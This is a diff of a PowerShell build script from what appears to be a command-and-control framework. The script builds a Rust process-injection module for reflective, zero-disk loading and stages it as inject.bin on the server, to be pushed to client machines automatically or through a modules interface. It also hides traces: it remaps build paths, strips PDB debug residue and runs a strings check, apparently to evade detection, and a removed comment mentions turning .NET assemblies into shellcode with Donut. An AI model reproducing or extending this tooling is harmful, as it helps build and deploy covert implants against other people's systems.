@@ -1,54 +1,60 @@
-# Build L2 inject sacrificial worker -> storage/modules/inject.bin
+# Build L2 inject worker PE → storage/modules/inject.bin
 #
-# Architecture v2: inject = standalone short-lived worker EXE (process
-# isolation). .NET assemblies are retired: convert them to shellcode
-# (e.g. Donut) and inject through this module.
+# Product artifact: cupcake_mod_inject.dll (cdylib, reflective/zero-disk path).
+# Legacy cupcake-inject-worker.exe is no longer the primary output.
 #
-# Post-processing: strips RSDS/PDB debug-directory residue (pe-strip-debug.py),
-# then runs the strings gate.
-#
-# Usage:
-#   powershell -File scripts/build-inject-module.ps1
+# Usage: powershell -File scripts/build-inject-module.ps1
+param(
+    [switch]$SkipGate
+)
 
-$ErrorActionPreference = "Stop"
+$ErrorActionPreference = 'Stop'
 $ServerRoot = Split-Path -Parent $PSScriptRoot
 $RepoRoot   = Split-Path -Parent $ServerRoot
-$ClientRoot = Join-Path $RepoRoot "Client"
-$OutDir     = Join-Path $ServerRoot "storage\modules"
-$ExeName    = "cupcake-inject-worker.exe"
-$StripPy    = Join-Path $PSScriptRoot "pe-strip-debug.py"
-$Gate       = Join-Path $ClientRoot "scripts\strings-gate.ps1"
+$ClientRoot = Join-Path $RepoRoot 'Client'
+$OutDir     = Join-Path $ServerRoot 'storage\modules'
+$Pkg        = 'cupcake-mod-inject'
+$SrcName    = 'cupcake_mod_inject.dll'
+$DstName    = 'inject.bin'
+$StripPy    = Join-Path $PSScriptRoot 'pe-strip-debug.py'
+$Gate       = Join-Path $ClientRoot 'scripts\strings-gate.ps1'
 
-if (-not (Test-Path $ClientRoot)) {
-    throw "Client tree not found: $ClientRoot"
-}
+if (-not (Test-Path $ClientRoot)) { throw "Client tree not found: $ClientRoot" }
 
-Write-Host "[*] cargo build -p cupcake-inject-worker --release"
+Write-Host "[*] cargo build -p $Pkg --release"
 Push-Location $ClientRoot
 try {
-    cargo build -p cupcake-inject-worker --release
+    $env:RUSTFLAGS = "--remap-path-prefix `"$ClientRoot`"=."
+    cargo build -p $Pkg --release
     if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
 } finally {
     Pop-Location
 }
 
-$src = Join-Path $ClientRoot "target\release\$ExeName"
+$src = Join-Path $ClientRoot "target\release\$SrcName"
 if (-not (Test-Path $src)) {
-    throw "built EXE not found: $src"
+    # fallback legacy names
+    foreach ($alt in @('cupcake-inject-worker.exe', 'cupcake_mod_inject.dll')) {
+        $c = Join-Path $ClientRoot "target\release\$alt"
+        if (Test-Path $c) { $src = $c; break }
+    }
 }
+if (-not (Test-Path $src)) { throw "built inject PE not found (expected $SrcName)" }
 
 New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
-$dst = Join-Path $OutDir "inject.bin"
+$dst = Join-Path $OutDir $DstName
 Copy-Item -Force $src $dst
 
-Write-Host "[*] stripping PE debug directory (RSDS/PDB path residue)"
-python $StripPy $dst
-if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+if (Test-Path $StripPy) {
+    Write-Host '[*] stripping PE debug directory (RSDS/PDB)'
+    python $StripPy $dst
+    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+}
 
-Write-Host "[+] Installed $dst ($((Get-Item $dst).Length) bytes)"
-Write-Host "    Push via Modules UI or auto on module_required:inject"
+Write-Host "[+] Installed $dst ($((Get-Item $dst).Length) bytes) from $(Split-Path $src -Leaf)"
+Write-Host '    Push via Modules UI or auto on module_required:inject'
 
-if (Test-Path $Gate) {
+if (-not $SkipGate -and (Test-Path $Gate)) {
     & $Gate -Path $dst
     if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
 }
